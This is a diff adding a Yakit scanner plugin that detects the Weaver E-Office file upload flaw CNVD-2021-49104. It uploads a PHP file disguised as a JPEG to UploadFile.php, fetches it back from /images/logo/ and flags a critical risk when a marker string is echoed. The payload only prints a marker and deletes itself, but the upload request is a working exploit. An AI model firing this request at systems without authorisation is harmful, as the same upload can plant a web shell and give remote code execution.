@@ -1,0 +1,105 @@
+# port scan plugin
+yakit.AutoInitYakit()
+log.setLevel("info")
+
+handleCheck = func(target,port){
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+
+    uploadpacket = `
+POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Connection: close
+Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
+Cookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348
+Content-Length: 193
+Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+
+--e64bdf16c554bbc109cecef6451c26a4
+Content-Disposition: form-data; name="Filedata"; filename="test.php"
+Content-Type: image/jpeg
+
+<?php echo "bddfc7ae66e16a0d9307374ce45d1293";unlink(__FILE__);?>
+
+--e64bdf16c554bbc109cecef6451c26a4--`
+
+    rsp,req,_ = poc.HTTP(uploadpacket, 
+    poc.params({"target":addr}),
+    poc.https(isTls),
+    poc.redirectTimes(0),
+    )
+
+    yakit.Info("正在上传测试文件...")
+    log.info("正在上传测试文件...")
+
+    rsphand, rspbody = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
+    urlpath = re.Find(rspbody, `\S*.php`)
+    
+    sendpacket = `
+GET /images/logo/{{params(urlpath)}} HTTP/1.1
+Host: {{params(target)}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Cookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+
+`
+
+    sendrsp,sendreq,_ = poc.HTTP(sendpacket, 
+    poc.params({"target":addr,"urlpath":urlpath}),
+    poc.https(isTls),
+    poc.redirectTimes(0),
+    )
+
+    hand, body = str.SplitHTTPHeadersAndBodyFromPacket(sendrsp)
+
+    drsp, derr = str.ParseBytesToHTTPResponse(sendrsp)
+    if derr != nil {
+        yakit.Error(string(derr))
+        return
+    }
+
+    if drsp.StatusCode == 200 && str.MatchAllOfSubString(body, `bddfc7ae66e16a0d9307374ce45d1293`) {
+        yakit.Info("Found 泛微E-Office 文件上传 CNVD-2021-49104 漏洞")
+        log.info("Found 泛微E-Office 文件上传 CNVD-2021-49104 漏洞")
+        risk.NewRisk(
+            addr,risk.title("泛微E-Office 文件上传 CNVD-2021-49104 漏洞"),
+            risk.severity("critical"),
+            risk.titleVerbose("泛微E-Office 文件上传 CNVD-2021-49104 漏洞"),
+            risk.type("文件上传[E-Office]"),
+            risk.request(string(req)),
+            risk.response(string(rsp)),
+        )
+    }
+
+}
+
+handle = func(result /* *fp.MatchResult */) {
+    // handle match result
+    if !result.IsOpen(){
+        return
+    }
+
+    // dump(result.GetServiceName())
+    // println("---------------------------")
+    // dump(result.GetCPEs())
+    // println("---------------------------")
+    // dump(result.GetDomains())
+    // println("---------------------------")
+    // dump(result.GetHtmlTitle())
+    // println("---------------------------")
+    // dump(result.GetProto())
+    // println("---------------------------")
+    //dump(result.Fingerprint.banner)
+
+    if len(result.Fingerprint.HttpFlows) > 0 {
+        handleCheck(result.Target,result.Port)
+    }
+    
+}
